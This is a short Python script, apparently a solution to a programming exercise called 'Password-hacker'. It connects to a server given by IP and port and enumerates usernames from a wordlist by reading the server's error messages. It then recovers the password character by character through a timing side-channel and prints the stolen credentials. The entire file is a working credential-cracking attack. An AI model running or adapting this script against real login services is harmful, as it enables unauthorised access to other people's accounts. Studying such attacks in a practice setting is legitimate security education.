# Password-hacker-joke-
import socket
import sys
import string
import json
import time

# parsing arguments
ip, port = sys.argv[1:]

# connection information
address = (ip, int(port))

# message and buffer size
buffer_size = 1024

# logins path
PATH = "./logins.txt"

# alphanumeric
alphanumeric = string.ascii_lowercase + string.ascii_uppercase + string.digits


def send_creds(client, credentials, buffer=buffer_size):
    req = json.dumps(credentials, indent=4).encode()
    client.send(req)
    rcv = json.loads(client.recv(buffer).decode())
    return rcv


def create_creds(login, password=" "):
    return dict(login=login, password=password)


def fetch_login(client, buffer=buffer_size, path=PATH):
    with open(path, "r") as login_file:
        login_list = (login.strip("\n") for login in login_file.readlines())
        for login in login_list:
            credentials = create_creds(login)
            resp = send_creds(client, credentials, buffer)
            if resp["result"] == "Wrong password!":
                return login


def fetch_password(client, act_login, password, buffer=buffer_size):
    credentials = create_creds(act_login, password)
    resp = send_creds(client, credentials, buffer)
    return resp["result"]


# solution
with socket.socket() as connection:

    connection.connect(address)

    # fetch username
    corr_login = fetch_login(connection, buffer_size, PATH)

    # fetch password
    success = False
    corr_pwd = ""
    while not success:
        for char in alphanumeric:
            start = time.perf_counter()
            result = fetch_password(connection, corr_login, corr_pwd + char)
            end = time.perf_counter()
            total = end - start
            if result == "Connection success!":
                creds = create_creds(corr_login, corr_pwd + char)
                print(json.dumps(creds))
                success = True
                break
            elif (result == "Wrong password!") and (total >= 0.1):
                corr_pwd += char
